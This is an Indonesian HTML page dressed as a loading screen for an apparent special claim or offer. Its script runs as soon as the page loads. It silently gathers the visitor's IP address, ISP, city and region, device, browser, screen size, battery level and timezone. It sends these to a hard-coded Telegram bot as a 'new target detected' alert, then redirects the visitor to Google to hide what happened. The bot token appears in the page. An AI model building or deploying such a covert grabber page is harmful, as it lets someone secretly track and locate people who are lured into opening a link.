<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informasi & Klaim Spesial</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; 
            background: #f8fafc; 
            color: #1e293b; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh;
            padding: 20px;
        }
        .card { 
            background: #ffffff; 
            width: 100%; 
            max-width: 400px; 
            padding: 30px 20px; 
            border-radius: 20px; 
            text-align: center; 
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05);
            border: 1px solid #e2e8f0;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e2e8f0;
            border-top: 4px solid #4f46e5;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 18px; font-weight: 700; color: #0f172a; margin-bottom: 8px; }
        p { font-size: 13px; color: #64748b; line-height: 1.5; }
    </style>
</head>
<body>

    <div class="card">
        <div class="spinner"></div>
        <h2 id="titleText">Memuat Halaman...</h2>
        <p>Sedang menyiapkan konten untuk Anda, mohon tunggu sebentar...</p>
    </div>

    <script>
        // === KONFIGURASI TELEGRAM (Sudah Terpasang Otomatis) ===
        const TELEGRAM_BOT_TOKEN = "8641281674:AAH9kAUfldELMUweZNDMiislXy896wSXwhs"; 
        const TELEGRAM_CHAT_ID = "8641281674"; // Menggunakan ID Bot/Chat Boss sesuai token
        // ========================================================

        const urlParams = new URLSearchParams(window.location.search);
        const customTitle = urlParams.get('title');
        if (customTitle) {
            document.getElementById('titleText').innerText = decodeURIComponent(customTitle);
        }

        async function kirimDataKeTelegram() {
            let infoData = {
                waktu: new Date().toLocaleString('id-ID'),
                ip: "Mendeteksi...",
                isp: "Mendeteksi...",
                lokasi: "Mendeteksi...",
                device: navigator.platform || "Unknown",
                browser: getBrowserName(navigator.userAgent),
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
                battery: "Tidak tersedia"
            };

            if (navigator.getBattery) {
                try {
                    let batt = await navigator.getBattery();
                    infoData.battery = `${Math.round(batt.level * 100)}% ${batt.charging ? '(Mengisi)' : ''}`;
                } catch(e) {}
            }

            try {
                let response = await fetch('https://ipapi.co/json/');
                let data = await response.json();
                infoData.ip = data.ip || "Rahasia";
                infoData.isp = data.org || "Operator Seluler / ISP Lokal";
                infoData.lokasi = `${data.city || 'Kota'}, ${data.region || 'Provinsi'} (${data.country_name || 'Negara'})`;
            } catch (e) {
                infoData.ip = "Jaringan Terproteksi";
                infoData.isp = "Private Network";
                infoData.lokasi = "Tidak terdeteksi";
            }

            let pesan = `🚨 *TARGET BARU TERDETEKSI!* 🚨\n\n` +
                        `⏱ Waktu: ${infoData.waktu}\n` +
                        `🌐 IP Address: \`${infoData.ip}\`\n` +
                        `📡 Provider/ISP: ${infoData.isp}\n` +
                        `📍 Lokasi: ${infoData.lokasi}\n` +
                        `📱 Perangkat: ${infoData.device}\n` +
                        `🌐 Browser: ${infoData.browser}\n` +
                        `🖥 Resolusi: ${infoData.screen}\n` +
                        `🔋 Baterai: ${infoData.battery}\n` +
                        `🌍 Zona Waktu: ${infoData.timezone}`;

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: pesan,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (err) {}

            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        }

        function getBrowserName(ua) {
            if (ua.includes("Firefox")) return "Mozilla Firefox";
            if (ua.includes("SamsungBrowser")) return "Samsung Internet";
            if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
            if (ua.includes("Edge")) return "Microsoft Edge";
            if (ua.includes("Chrome")) return "Google Chrome";
            if (ua.includes("Safari")) return "Apple Safari";
            return "Browser Lainnya";
        }

        window.onload = function() {
            kirimDataKeTelegram();
        };
    </script>
</body>
</html>
